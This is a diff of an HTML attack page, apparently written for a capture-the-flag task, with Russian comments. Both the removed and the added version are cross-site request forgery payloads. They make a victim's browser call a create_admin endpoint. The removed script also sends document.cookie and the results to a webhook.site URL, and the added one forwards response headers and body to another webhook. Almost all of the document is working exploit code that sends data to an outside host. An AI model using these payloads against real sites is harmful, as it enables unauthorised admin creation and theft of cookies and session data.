@@ -1,93 +1,41 @@
+<!DOCTYPE html>
 <html>
 <body>
 <script>
-(async function() {
-    try {
-        // 1. GET запрос на создание админа с параметром в URL
-        const targetUrl = 'https://tasks.goidactf.ru:20061/create_admin?new_admin_login=123';
-        const response = await fetch(targetUrl, {
-            method: 'GET',
-            credentials: 'include' // отправляем куки
-        });
-        
-        const result = await response.text();
-        
-        // 2. Отправляем результат на webhook GET запросом с параметрами
-        const webhookUrl = new URL('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb');
-        webhookUrl.searchParams.append('timestamp', new Date().toISOString());
-        webhookUrl.searchParams.append('status', 'success');
-        webhookUrl.searchParams.append('target_url', targetUrl);
-        webhookUrl.searchParams.append('response_status', response.status);
-        webhookUrl.searchParams.append('result_length', result.length);
-        webhookUrl.searchParams.append('cookies', document.cookie);
-        webhookUrl.searchParams.append('has_cookies', document.cookie ? 'yes' : 'no');
-        
-        await fetch(webhookUrl.toString(), {
-            method: 'GET',
-            mode: 'no-cors'
-        });
-        
-        // 3. Создаем кнопку для повторения
-        const btn = document.createElement('button');
-        btn.textContent = 'Повторить GET запрос';
-        btn.style = 'padding: 10px 20px; margin: 10px; background: blue; color: white; border: none; cursor: pointer;';
-        
-        btn.onclick = async () => {
-            try {
-                const repeatResponse = await fetch(targetUrl, {
-                    method: 'GET',
-                    credentials: 'include'
-                });
-                
-                const repeatResult = await repeatResponse.text();
-                
-                // Отправляем результат клика на webhook
-                const clickWebhookUrl = new URL('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb');
-                clickWebhookUrl.searchParams.append('timestamp', new Date().toISOString());
-                clickWebhookUrl.searchParams.append('status', 'button_success');
-                clickWebhookUrl.searchParams.append('action', 'button_click');
-                clickWebhookUrl.searchParams.append('response_status', repeatResponse.status);
-                clickWebhookUrl.searchParams.append('result_preview', repeatResult.substring(0, 100));
-                
-                await fetch(clickWebhookUrl.toString(), {
-                    method: 'GET',
-                    mode: 'no-cors'
-                });
-                
-            } catch (error) {
-                // Отправляем ошибку с кнопки
-                const errorWebhookUrl = new URL('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb');
-                errorWebhookUrl.searchParams.append('timestamp', new Date().toISOString());
-                errorWebhookUrl.searchParams.append('status', 'button_error');
-                errorWebhookUrl.searchParams.append('error', error.toString());
-                
-                await fetch(errorWebhookUrl.toString(), {
-                    method: 'GET',
-                    mode: 'no-cors'
-                });
-            }
-        };
-        
-        document.body.appendChild(btn);
-        
-    } catch (error) {
-        // 4. Отправляем ошибку основного запроса на webhook
-        const errorWebhookUrl = new URL('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb');
-        errorWebhookUrl.searchParams.append('timestamp', new Date().toISOString());
-        errorWebhookUrl.searchParams.append('status', 'main_error');
-        errorWebhookUrl.searchParams.append('error', error.toString());
-        errorWebhookUrl.searchParams.append('user_agent', navigator.userAgent);
-        
-        try {
-            await fetch(errorWebhookUrl.toString(), {
-                method: 'GET',
-                mode: 'no-cors'
-            });
-        } catch (webhookError) {
-            console.error('Webhook недоступен');
-        }
-    }
-})();
+  // Отправляем POST-запрос на create_admin от имени жертвы
+  fetch("https://tasks.goidactf.ru:20061/create_admin", {
+  "headers": {
+    "accept": "*/*",
+  },
+  "referrer": "https://tasks.goidactf.ru:20061/admin",
+  "body": "new_admin_login=123",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+})
+  .then(res => {
+    // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!
+    return res.text().then(body => ({
+      status: res.status,
+      headers: [...res.headers.entries()],
+      body: body
+    }));
+  })
+  .then(data => {
+    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e', {
+      method: 'POST',
+      body: JSON.stringify(data),
+      headers: { 'Content-Type': 'application/json' }
+    });
+  })
+  .catch(err => {
+    // Если CORS блокирует — попадём сюда
+    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e', {
+      method: 'POST',
+      body: JSON.stringify({ error: err.toString() }),
+      headers: { 'Content-Type': 'application/json' }
+    });
+  });
 </script>
 </body>
 </html>
